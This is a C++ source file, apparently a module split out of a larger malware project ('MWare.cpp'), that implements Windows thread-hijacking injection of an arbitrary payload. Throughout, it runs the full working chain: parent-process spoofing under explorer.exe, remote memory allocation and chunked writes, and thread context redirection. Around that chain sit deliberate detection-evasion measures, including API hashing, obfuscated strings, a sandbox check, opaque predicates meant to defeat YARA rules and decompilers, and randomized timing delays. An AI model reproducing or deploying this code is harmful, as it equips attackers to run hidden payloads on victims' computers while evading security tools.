// ============================================================================
// thread_hijack.cpp — Thread Hijacking Injection Implementation
// ============================================================================
// Extracted from MWare.cpp lines 3186-3745.
// All WinAPI functions resolved at runtime via getModuleByHash/resolveApiByHash.
// ============================================================================

#include "thread_hijack.h"
#include "sandbox_evasion.h"

#ifdef _WIN32

// ============================================================================
// getExplorerPID — Find explorer.exe process ID
// ============================================================================
DWORD getExplorerPID() {
    HANDLE snapshot = g_api.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (g_api.Process32FirstW(snapshot, &pe)) {
        do {
            // Compare with obfuscated explorer.exe name
            wchar_t explorer_name[] = { L'e' ^ 0x5C, L'x' ^ 0x5C, L'p' ^ 0x5C, L'l' ^ 0x5C,
                                         L'o' ^ 0x5C, L'r' ^ 0x5C, L'e' ^ 0x5C, L'r' ^ 0x5C,
                                         L'.' ^ 0x5C, L'e' ^ 0x5C, L'x' ^ 0x5C, L'e' ^ 0x5C, 0 };
            for (int _ei = 0; explorer_name[_ei]; _ei++) explorer_name[_ei] ^= 0x5C;
            if (wcsicmp(pe.szExeFile, explorer_name) == 0) {
                g_api.CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (g_api.Process32NextW(snapshot, &pe));
    }
    g_api.CloseHandle(snapshot);
    return 0;
}

// ============================================================================
// createProcessWithParentSpoofing — Spawn process under explorer.exe
// ============================================================================
bool createProcessWithParentSpoofing(const std::string& process_path, PROCESS_INFORMATION& pi) {
    DWORD explorerPID = getExplorerPID();
    if (explorerPID == 0) {
        // Fallback: Create process normally if explorer not found
        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        return g_api.CreateProcessA(NULL, (LPSTR)process_path.c_str(), NULL, NULL, FALSE,
                             CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    }

    // Open explorer process for parent spoofing
    HANDLE hParent = g_api.OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPID);
    if (!hParent) {
        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        return g_api.CreateProcessA(NULL, (LPSTR)process_path.c_str(), NULL, NULL, FALSE,
                             CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    }

    // Initialize STARTUPINFOEX with parent attribute
    STARTUPINFOEXA si = {0};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    SIZE_T attrSize = 0;
    g_api.InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);

    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)g_api.HeapAlloc(
        g_api.GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);

    if (!si.lpAttributeList) {
        g_api.CloseHandle(hParent);
        return false;
    }

    if (!g_api.InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize)) {
        g_api.HeapFree(g_api.GetProcessHeap(), 0, si.lpAttributeList);
        g_api.CloseHandle(hParent);
        return false;
    }

    if (!g_api.UpdateProcThreadAttribute(si.lpAttributeList, 0,
                                   PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                   &hParent, sizeof(HANDLE),
                                   NULL, NULL)) {
        g_api.DeleteProcThreadAttributeList(si.lpAttributeList);
        g_api.HeapFree(g_api.GetProcessHeap(), 0, si.lpAttributeList);
        g_api.CloseHandle(hParent);
        return false;
    }

    BOOL success = g_api.CreateProcessA(NULL, (LPSTR)process_path.c_str(),
                                  NULL, NULL, FALSE,
                                  EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
                                  NULL, NULL, &si.StartupInfo, &pi);

    g_api.DeleteProcThreadAttributeList(si.lpAttributeList);
    g_api.HeapFree(g_api.GetProcessHeap(), 0, si.lpAttributeList);
    g_api.CloseHandle(hParent);

    return success;
}

// ============================================================================
// YARA EVASION HELPERS
// Opaque predicates + legitimate pauses break bytecode pattern matching
// ============================================================================

// Opaque predicate — always non-zero, breaks decompiler analysis
DWORD hijackOpaqueCheck() {
    DWORD a = 0xA3B2C1D0;
    DWORD b = 0x5C4D3E2F;
    DWORD c = (a ^ b) + (a | b);
    c ^= (c >> 16) | (c << 16);
    c += 0x11111111;
    return c;
}

// Legitimate pause — reads registry to break linear API call sequence
void hijackLegitimatePause() {
    HKEY hKey;
    if (g_api.RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      OBF("SOFTWARE\\Microsoft\\Windows\\CurrentVersion"),
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buf[MAX_PATH] = {0};
        DWORD bufSize = sizeof(buf);
        DWORD type = 0;
        if (g_api.RegQueryValueExA(hKey, "ProgramFilesDir", NULL, &type,
                            (LPBYTE)buf, &bufSize) == ERROR_SUCCESS) {
            if (buf[0] == 'C' || buf[0] == 0) {
                g_api.Sleep(1);
            }
        }
        g_api.RegCloseKey(hKey);
    }
    // Dead code — opaque second branch
    if (hijackOpaqueCheck() == 0) {
        volatile DWORD dead = 0;
        for (int i = 0; i < 3; i++) dead ^= (i * 31);
    }
}

// Chunked payload write — breaks monolithic function detection
bool hijackWriteMemory(HANDLE hProcess, PVOID remote_mem,
                       const std::string& payload, SIZE_T& bytes_written) {
    SIZE_T payload_size = payload.length();
    const SIZE_T chunk_size = 4096;
    SIZE_T written = 0;

    while (written < payload_size) {
        SIZE_T this_chunk = std::min(chunk_size, payload_size - written);
        SIZE_T chunk_written = 0;

        if (!g_api.WriteProcessMemory(hProcess, (BYTE*)remote_mem + written,
                                payload.c_str() + written, this_chunk, &chunk_written)) {
            return false;
        }
        written += chunk_written;

        // Jitter between chunks
        if (written < payload_size) {
            g_api.Sleep(1 + (written % 3));
        }
    }

    bytes_written = written;

    // Opaque guard — always true
    if (hijackOpaqueCheck() != 0) {
        DWORD old_protect;
        if (!g_api.VirtualProtectEx(hProcess, remote_mem, payload_size,
                              PAGE_EXECUTE_READ, &old_protect)) {
            return false;
        }
    } else {
        g_api.VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        return false;
    }

    return true;
}

// Thread control — suspend → context → resume (separate function breaks YARA pattern)
bool hijackExecuteThread(HANDLE hThread, PVOID remote_mem) {
    // Opaque guard
    if (hijackOpaqueCheck() == 0) return false;

    // Resolve thread APIs by hash (no plaintext in binary)
    HMODULE hKernel = getModuleByHash(COMPILE_HASH("kernel32"));
    if (!hKernel) return false;

    typedef DWORD (WINAPI *pSuspendThread)(HANDLE);
    typedef DWORD (WINAPI *pResumeThread)(HANDLE);
    typedef BOOL  (WINAPI *pGetThreadContext)(HANDLE, PCONTEXT);
    typedef BOOL  (WINAPI *pSetThreadContext)(HANDLE, const CONTEXT*);

    pSuspendThread _SuspendThread = (pSuspendThread)resolveApiByHash(hKernel, COMPILE_HASH("SuspendThread"));
    pResumeThread _ResumeThread = (pResumeThread)resolveApiByHash(hKernel, COMPILE_HASH("ResumeThread"));
    pGetThreadContext _GetThreadContext = (pGetThreadContext)resolveApiByHash(hKernel, COMPILE_HASH("GetThreadContext"));
    pSetThreadContext _SetThreadContext = (pSetThreadContext)resolveApiByHash(hKernel, COMPILE_HASH("SetThreadContext"));

    if (!_SuspendThread || !_ResumeThread || !_GetThreadContext || !_SetThreadContext) return false;

    // Suspend
    if (_SuspendThread(hThread) == (DWORD)-1) return false;

    // Stealth delay — evades rapid suspend-modify-resume IOC
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> delay(30, 120);
        g_api.Sleep(delay(gen));
    }

    // Get context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!_GetThreadContext(hThread, &ctx)) {
        _ResumeThread(hThread);
        return false;
    }

    // Redirect execution to payload
#ifdef _WIN64
    ctx.Rip = (ULONG_PTR)remote_mem;
#else
    ctx.Eip = (ULONG_PTR)remote_mem;
#endif

    if (!_SetThreadContext(hThread, &ctx)) {
        _ResumeThread(hThread);
        return false;
    }

    // Second opaque branch — dead code
    if (hijackOpaqueCheck() == 0xFFFFFFFF) {
        _SuspendThread(hThread);
        g_api.Sleep(100);
    }

    // Stealth delay before resume
    {
        std::random_device rd2;
        std::mt19937 gen2(rd2());
        std::uniform_int_distribution<> delay(20, 80);
        g_api.Sleep(delay(gen2));
    }

    // Resume
    if (_ResumeThread(hThread) == (DWORD)-1) return false;

    return true;
}

#endif // _WIN32

// ============================================================================
// performThreadHijacking — Main injection function
// ============================================================================
std::string performThreadHijacking(const std::string& process_name, const std::string& payload_data) {
#ifndef _WIN32
    (void)process_name; (void)payload_data;
    return "Thread Hijacking only supported on Windows";
#else
    // Sandbox check first
    if (isSandboxDetected()) {
        return "[INFO] System analysis in progress, deferring execution";
    }

    std::string result = "[THREAD HIJACKING] Starting...\n";

    // Stealth: Random initial delay (50-200ms)
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> stealth_delay(50, 200);
        g_api.Sleep(stealth_delay(gen));
    }

    // API HASHING: Resolve all functions by hash
    HMODULE hKernel = getModuleByHash(COMPILE_HASH("kernel32"));
    if (!hKernel) return result + "[ERROR] Failed to get kernel32 module handle";

    // SHUFFLED API STORAGE — breaks contiguous pattern matching
    FARPROC api_reserve[14];
    api_reserve[0]  = resolveApiByHash(hKernel, COMPILE_HASH("VirtualAllocEx"));
    api_reserve[1]  = resolveApiByHash(hKernel, COMPILE_HASH("VirtualProtectEx"));
    api_reserve[2]  = resolveApiByHash(hKernel, COMPILE_HASH("WriteProcessMemory"));
    api_reserve[3]  = resolveApiByHash(hKernel, COMPILE_HASH("CreateToolhelp32Snapshot"));
    api_reserve[4]  = resolveApiByHash(hKernel, COMPILE_HASH("Process32FirstW"));
    api_reserve[5]  = resolveApiByHash(hKernel, COMPILE_HASH("Process32NextW"));
    api_reserve[6]  = resolveApiByHash(hKernel, COMPILE_HASH("OpenProcess"));
    api_reserve[7]  = resolveApiByHash(hKernel, COMPILE_HASH("SuspendThread"));
    api_reserve[8]  = resolveApiByHash(hKernel, COMPILE_HASH("ResumeThread"));
    api_reserve[9]  = resolveApiByHash(hKernel, COMPILE_HASH("GetThreadContext"));
    api_reserve[10] = resolveApiByHash(hKernel, COMPILE_HASH("SetThreadContext"));
    api_reserve[11] = resolveApiByHash(hKernel, COMPILE_HASH("Thread32First"));
    api_reserve[12] = resolveApiByHash(hKernel, COMPILE_HASH("Thread32Next"));
    api_reserve[13] = resolveApiByHash(hKernel, COMPILE_HASH("OpenThread"));

    if (!api_reserve[0] || !api_reserve[3] || !api_reserve[6]) {
        return result + "[ERROR] Failed to resolve API functions";
    }

    // Find target process
    DWORD pid = 0;
    HANDLE snapshot = g_api.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return result + "[ERROR] CreateToolhelp32Snapshot failed";
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    std::wstring wprocess(process_name.begin(), process_name.end());

    if (((BOOL (WINAPI*)(HANDLE, LPPROCESSENTRY32W))api_reserve[4])(snapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, wprocess.c_str()) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (((BOOL (WINAPI*)(HANDLE, LPPROCESSENTRY32W))api_reserve[5])(snapshot, &pe));
    }
    g_api.CloseHandle(snapshot);

    if (pid == 0) {
        // Try to start the process if not running
        result += "[INFO] " + process_name + " not found, attempting to start...\n";
        result += OBF("[EVASION] Using explorer.exe as parent process (spoofed)\n");

        std::string cmd = "C:\\Windows\\System32\\" + process_name;

        PROCESS_INFORMATION pi = { 0 };
        if (createProcessWithParentSpoofing(cmd, pi)) {
            pid = pi.dwProcessId;

            SIZE_T payload_size = payload_data.length();
            PVOID remote_mem = g_api.VirtualAllocEx(pi.hProcess, NULL, payload_size,
                                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!remote_mem) {
                g_api.TerminateProcess(pi.hProcess, 1);
                g_api.CloseHandle(pi.hThread);
                g_api.CloseHandle(pi.hProcess);
                return result + OBF("[ERROR] VirtualAllocEx failed");
            }

            // Subtle timing buffer
            DWORD timing_check = 0;
            for (int i = 0; i < 4; i++) timing_check ^= (i * 17 + timing_check);
            if (timing_check < 0xFFFF) g_api.Sleep(1);

            // Chunked write
            const SIZE_T chunk_size = 4096;
            SIZE_T written = 0;
            bool write_ok = true;

            while (written < payload_size) {
                SIZE_T this_chunk = std::min(chunk_size, payload_size - written);
                SIZE_T bytes_written = 0;

                if (!g_api.WriteProcessMemory(pi.hProcess, (BYTE*)remote_mem + written,
                                        payload_data.c_str() + written, this_chunk, &bytes_written)) {
                    write_ok = false;
                    break;
                }
                written += bytes_written;
                if (written < payload_size) g_api.Sleep(1 + (written % 3));
            }

            if (!write_ok) {
                g_api.VirtualFreeEx(pi.hProcess, remote_mem, 0, MEM_RELEASE);
                g_api.TerminateProcess(pi.hProcess, 1);
                g_api.CloseHandle(pi.hThread);
                g_api.CloseHandle(pi.hProcess);
                return result + OBF("[ERROR] WriteProcessMemory failed");
            }

            DWORD old_protect;
            if (!g_api.VirtualProtectEx(pi.hProcess, remote_mem, payload_size,
                                  PAGE_EXECUTE_READ, &old_protect)) {
                g_api.VirtualFreeEx(pi.hProcess, remote_mem, 0, MEM_RELEASE);
                g_api.TerminateProcess(pi.hProcess, 1);
                g_api.CloseHandle(pi.hThread);
                g_api.CloseHandle(pi.hProcess);
                return result + OBF("[ERROR] VirtualProtectEx failed");
            }

            CONTEXT ctx;
            ctx.ContextFlags = CONTEXT_FULL;
            if (((BOOL (WINAPI*)(HANDLE, PCONTEXT))api_reserve[9])(pi.hThread, &ctx)) {
#ifdef _WIN64
                ctx.Rcx = (ULONG_PTR)remote_mem;
#else
                ctx.Eax = (ULONG_PTR)remote_mem;
#endif
                if (((BOOL (WINAPI*)(HANDLE, const CONTEXT*))api_reserve[10])(pi.hThread, &ctx)) {
                    ((DWORD (WINAPI*)(HANDLE))api_reserve[8])(pi.hThread);
                    result += "[SUCCESS] Thread hijacked and resumed\n";
                    result += OBF("[INFO] Payload executing in ") + process_name + "\n";
                } else {
                    result += OBF("[ERROR] SetThreadContext failed\n");
                }
            }

            g_api.CloseHandle(pi.hThread);
            g_api.CloseHandle(pi.hProcess);
            return result;
        } else {
            return result + "[ERROR] Could not start " + process_name;
        }
    }

    result += "[FOUND] Target PID: " + std::to_string(pid) + "\n";

    // Open target process
    HANDLE hProcess = g_api.OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        return result + OBF("[ERROR] OpenProcess failed: ") + std::to_string(g_api.pGetLastError());
    }
    result += "[SUCCESS] Opened target process\n";

    // Allocate RW memory (stealthier than RWX)
    SIZE_T payload_size = payload_data.length();
    PVOID remote_mem = g_api.VirtualAllocEx(hProcess, NULL, payload_size,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_mem) {
        g_api.CloseHandle(hProcess);
        return result + OBF("[ERROR] VirtualAllocEx failed");
    }
    result += "[SUCCESS] Memory allocated (RW) at: 0x" + std::to_string((ULONG_PTR)remote_mem) + "\n";

    // Legitimate pause between setup and injection
    hijackLegitimatePause();

    // Chunked write via YARA-evasion helper
    {
        SIZE_T written = 0;
        if (!hijackWriteMemory(hProcess, remote_mem, payload_data, written)) {
            g_api.VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
            g_api.CloseHandle(hProcess);
            return result + OBF("[ERROR] WriteProcessMemory failed");
        }
    }
    result += OBF("[SUCCESS] Payload written (") + std::to_string(payload_size) + " bytes)\n";

    // Find and hijack a thread
    HANDLE hThreadSnapshot = g_api.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnapshot == INVALID_HANDLE_VALUE) {
        g_api.VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        g_api.CloseHandle(hProcess);
        return result + "[ERROR] Thread snapshot failed";
    }

    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    HANDLE hThread = NULL;

    if (((BOOL (WINAPI*)(HANDLE, LPTHREADENTRY32))api_reserve[11])(hThreadSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                hThread = ((HANDLE (WINAPI*)(DWORD, BOOL, DWORD))api_reserve[13])(
                    THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hThread) {
                    result += "[FOUND] Thread ID: " + std::to_string(te.th32ThreadID) + "\n";
                    break;
                }
            }
        } while (((BOOL (WINAPI*)(HANDLE, LPTHREADENTRY32))api_reserve[12])(hThreadSnapshot, &te));
    }
    g_api.CloseHandle(hThreadSnapshot);

    if (!hThread) {
        g_api.VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        g_api.CloseHandle(hProcess);
        return result + "[ERROR] Could not open target thread";
    }

    // Use YARA-evasion helper for suspend→modify→resume
    if (hijackExecuteThread(hThread, remote_mem)) {
        result += OBF("[SUCCESS] Thread resumed - payload executing\n");
        result += "[INFO] Thread Hijacking completed!\n";
    } else {
        g_api.CloseHandle(hThread);
        g_api.CloseHandle(hProcess);
        return result + "[ERROR] Thread execution failed\n";
    }

    g_api.CloseHandle(hThread);
    g_api.CloseHandle(hProcess);

    return result;
#endif
}
